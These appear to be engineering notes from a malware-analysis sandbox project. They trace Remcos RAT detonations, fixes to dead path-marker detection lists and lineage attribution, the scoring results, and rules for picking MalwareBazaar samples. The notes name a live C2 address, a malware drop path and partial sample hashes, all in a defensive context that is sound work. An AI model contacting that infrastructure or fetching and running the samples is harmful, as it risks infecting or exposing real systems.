| Spawn re-dump catches `smng.exe` populated | **Fired at t11**, child first seen t1 — feature works |
| Carver reports `present`, not `strong` | **Reported 0.** Correct: see below |
| `sysmon_injection_events: 0` | **Held**, as designed |

**The re-dump worked but had nothing to reveal.** All five dumps matched the same
three Remcos rules, because `smng.exe` was already Remcos at t1 — this sample
drops and executes rather than hollowing. Whatever it wrote into the suspended
child was configuration, not an image, which is also why the carver's 0 is
correct rather than a miss.

**The carver's first run on real dumps was clean**: 43 modules, 250–274 regions
per image, `rejected: 0`, `resource_only: 0`, no false positives on live
malware.

### Four bugs this run exposed, all fixed

1. **46 path markers across four modules had never matched anything.** They are
   compared with a plain `in` test but were written regex-style — `r"\users\\"`
   is a literal *double* backslash, which appears in no Windows path. See
   *The dead-marker bug* below; it is the largest single defect found so far.
2. **`external_contact` could not fire for an IP-only C2.** `present` gated on
   `notable_domains > 0 or external_destinations > 0`. Remcos dialled a
   hard-coded IP, so there was no DNS lookup; FakeNet diverted the connection, so
   the pcap logged none. The diverter's per-process record had it,
   `sample_unusual_ports` named it exactly — and `strong` is only consulted for a
   category already `present`. A C2 contact the pipeline watched, attributed and
   flagged scored nothing, costing a whole verdict band. `unusual_ports` now
   makes the category present in its own right.
3. **The sample's own process was never dumped, and nothing said so.** The root
   has one route to being imaged — a scheduled offset coming due while it is
   alive. The spawn dump excludes it by design and the exit dump runs when it is
   already unreadable. The parent exited at ~t1 with the first offset at +5, so
   all five dumps were of the child, and `dumps_skipped` read 0. **That was the
   process that did the unpacking.** A skip is now recorded naming the offsets
   that were pending.
4. **A blank autoruns row counted as suspicious.** Two genuine Run keys were
   reported as three; the extra row had a category and a hive location and
   nothing else, and qualified purely by being "Logon" with no signer.

Also: the report's autoruns table had no **Location** column, which is why the
two genuine entries rendered as an apparent duplicate.

### The dead-marker bug

Found by fixing the first instance and then sweeping for the rest. **46 markers
in four modules**, every one matched with a plain `in` or `startswith` test and
every one written with a doubled separator that no real path contains:

| Module | What was dead |
|---|---|
| `procmon_parser` | user-writable roots, the noise list, `\currentcontrolset\services\` |
| `dropped_file_triage` | **all five** suspicious locations, **all seven** exclusions, all six analyzer-noise markers |
| `diff_tasks`, `diff_services` | all five suspicious-path hints in each |
| `findings` | services and drivers markers, and both copies of the analyzer case-path suppression |

**`dropped_file_triage` is the one that mattered most.**
`collect_dropped_file_candidates` discards any candidate whose path is not in a
suspicious location, so with that list dead `total_candidates` was pinned at 0
*structurally*. Fixing the Procmon side alone would not have moved it — the
Remcos drop would have reached that function and been thrown away there instead.
The first fix was incomplete and would have looked like a failed re-run.

Each module needed its suppression list repaired in the same change as its
detection list. A live detector against a dead exclusion list is worse than
both being dead: `\cases\` suppression exists precisely because the analyzer
writes thousands of files into the directory it is watching.

**A guard test now scans every module in the package** for short path-shaped
literals containing a doubled backslash and fails on any of them. That is the
part worth keeping — the instances are fixed, but the class of bug is invisible
to review and survived 332 tests.

One consequence to watch: repairing `\currentcontrolset\services\` on the
general list took `registry_create` from 5 interesting events to **140** in a
run where the sample did nothing, purely from Windows service-key churn. It is
now on a separate value-writes-only list, so setting `ImagePath` fires and
creating a service key does not.

### The 03:56 clean-baseline run — the fixes proved out, and exposed three more

| | 02:54 | 03:56 |
|---|---|---|
| `file_write_events` | 0 | 12 |
| Dropped candidates | 0 | 13 |
| `external_contact` | absent | **strong** |
| `autoruns_suspicious` | 3 | 2 |
| Score | 70 · Elevated Attention | **140 · Likely Malicious** |

`%APPDATA%\Roaming\Config\smng.exe` appeared 30 times in the suspicious-path
hits, from both the sample and `smng.exe`. `external_contact` fired strong off
`62.60.226.68:24042` with no DNS involved. The spawn re-dump fired at t12 for a
child first seen at t2, and both root-skip records were present.

**Then the same run showed what letting file events through had not been
prepared for.** All three were invisible while the markers were dead:

- **Eleven of the thirteen "dropped files" did not exist.** `WINMM.dll`,
  `urlmon.dll`, `WININET.dll`, `iertutil.dll` in `%APPDATA%\Roaming\Config` —
  `smng.exe` walking the DLL search order in its own directory. Failed opens.
  `payload_dropped` reached **strong** on a true count of one. Now filtered on
  the Procmon result, deliberately as a not-found list rather than "keep only
  SUCCESS", because a file written and then deleted is still a drop.
- **`persistence_hits`, `suspicious_path_hits` and `top_written_paths` were
  never attributed by lineage.** `svchost.exe` rewriting
  `\Tasks\Microsoft\Windows\UpdateOrchestrator\Schedule Work` supplied 12 of 14
  persistence hits and *every* row of `top_written_paths`. They now follow the
  same collect-then-filter pattern the network records already used — with one
  exception, below.
- **FakeNet's own WinDivert driver counted as a finding**, three times. It
  unpacks into `%TEMP%\_MEInnnnn`, which contains none of the workbench's
  directory names. The exclusion had to be added in **two** places: `findings`
  and `dropped_file_triage` keep separate analyzer lists, and repairing only the
  first still left `payload_dropped` strong on our own driver plus one real drop.

**Not everything is lineage-gated, and the split is deliberate.** An OS
persistence surface is touched by Windows constantly and only means something
when the sample touches it. An executable or script written into a user-writable
directory is notable whoever produced it, because a sample can cause a write it
does not perform — through injection, COM, a service or WMI — and lineage cannot
see that. Gating both would have thrown away a payload dropped into `%TEMP%` by
an injected `svchost.exe`. Two existing tests failed when the first version of
this fix collapsed the two, which is how the distinction got found.

Replaying the run through the fixed code: persistence 14 → 2, suspicious paths
39 → 19, dropped 13 → 1, `top_written_paths` now the drop instead of Windows
Update, and **125 · Likely Malicious** with `payload_dropped` correctly
`present` rather than strong. The verdict band does not move — two genuinely
strong categories carry it either way — which is the point: the score was right
for partly wrong reasons.

The report now lists the dropped files with an **On disk** column, rather than
only the counts. That column is what would have shown this at a glance.

### The 04:38 run — the attribution fixes proved out

**125 · Likely Malicious**, exactly as the replay predicted. `payload_dropped`
correctly `present` on one real drop that exists on disk; `persistence_hits` 2
rather than 14; `top_written_paths` empty of Windows Update; dropped candidates
1 rather than 13 with none missing.

It also showed two more instances of the same fix applied in only one place, and
one honest naming problem:

- **The not-found filter was in `dropped_file_triage` and not in `findings`.**
  Nine non-existent DLLs stayed in `suspicious_path_hits` while being correctly
  absent from the dropped-file count. Third time a fix has needed applying to a
  sibling module.
- **The notable-whoever-produced-it exemption was applied to any event naming
  the path**, so `svchost.exe` *opening* the payload six times — Defender and
  the indexer noticing a new executable — was exempted from lineage along with
  the drop itself.
- **`file_write_events: 0` on a run that dropped a PE.** The tile grid read
  "File Writes 0" beside "Dropped Files 1", because only `WriteFile` counted and
  Procmon logged the drop as a `CreateFile`.

**A CreateFile is not a creation**, and the disposition in the detail is the only
thing that says which. The proportions make the case: of 42 suspicious-path hits
on that run, exactly **one** carried `Disposition: OverwriteIf` — the write of
`smng.exe`. The other 37 file events were all `Disposition: Open`.

Replayed: suspicious paths 42 → 26, DLL probes 9 → 0, svchost opens 7 → 0,
`file_write_events` 0 → 1 with `top_written_paths` naming the drop.

One distinction that cost a test to find: **"is this a mere open" does not apply
to events that are not file operations at all.** The first version tested for
production and used it to gate the exemption, which suppressed a process create
of a relocated executable — a finding whoever started it, with its own existing
test saying so. The two are now inverse tests rather than the same one.

### The 13:47 run closed it

Every predicted number landed exactly: hits 42 → **26**, DLL probes → **0**,
`svchost` opens → **0**, `file_write_events` 0 → **2** with `top_written_paths`
naming `smng.exe`, and the score unchanged at **125 · Likely Malicious** — the
fix cleans the evidence lists without touching the verdict, which is what it was
supposed to do.

The kept hit list now reads end to end: 17 sample and 4 `smng.exe` opens of the
payload, one write, one process create, two Run keys, one image load. Nothing
else.

`background_persistence_hits` was **0** on this run against 10 on the last one,
because Windows Update did not touch its scheduled task during the window. That
is the filter having nothing to do rather than not working — and the count is
what says which, which is the entire reason those counters exist.

**This is the Remcos sample finished.** Gap 1 is closed on both halves, the spawn
re-dump is proven, and the carver's parsing is proven on real dumps. What is left
is listed below and needs different samples, not another run of this one.

### The 03:22 re-run was void — revert the VM first

The second run of this sample tested nothing, because the guest was not reverted.
Remcos was **already installed and still running**: `smng.exe` appears in
FakeNet's table at PID 10756, the identical PID from the 02:54 run, still
beaconing to `62.60.226.68:24042`, and `autoruns before_total: 1605` is exactly
the previous run's `after_total`. The sample found its own installation and
exited with code 2 — one process create, no spawn, no new autorun entries.

Two things that run did establish. The root-never-dumped skip fired verbatim,
naming `+2s, +25s`, and it is the only reason the run was diagnosable at all.
And lineage attribution handled the contamination correctly: `smng.exe` was
counted as a *background* process rather than the sample's, so its very real C2
traffic was not scored — which was right, because it was not this run's.

**Revert to the clean snapshot before re-running.** A sample that installs
persistence is not idempotent, and a dirty baseline turns a detonation into a
no-op that reads like a clean result.

### Why this one, after two rejections

Recorded so the next session does not re-tread it. Two MalwareBazaar samples
labelled Formbook were rejected on their sandbox reports before any run:

- `d712b6f9…` — 1 MB .NET crypter, an unnamed 931,963-byte `.rsrc` resource at
  entropy 7.99, so the payload is embedded rather than fetched. FileScan's
  report is **static with emulation only** (`success_partial`), so it has no
  process tree, no registry and no network to judge; it never names a family
  either. Its similarity search claims 1.0 to a non-.NET Sality sample, which is
  not credible. Still a live candidate for gap 3 — vxCube reports
  *"unauthorized injection to a recently created process"* — but unproven.
- `1cf5d1800…` — Triage `260608-lr276sbx8p`. Scored 10/10 on both Win10-2004
  and Win11-21H2 and **crashed on both**: the only children are `WerFault.exe`,
  both targeting the sample's own PID, with a `Program crash` signature and no
  injection, persistence or network. A shorter chain than `422e30ed`, which at
  least reached three `RegSvcs`.

**The lesson is a selection rule.** A 10/10 score with a two-node process tree
ending in `WerFault` is a crash, not a compromise — the score came from family
identification and a payload memory hit, not from a completed chain. Read the
process tree before the score: reject when the only child is `WerFault.exe`,
take when a real child appears alongside an autostart or `SetThreadContext`
signature. Note also that Triage, with a mature Formbook config extractor, still
produced an empty **Malware Config** panel for that sample — roughly where this
pipeline's memory YARA landed on `422e30ed`.
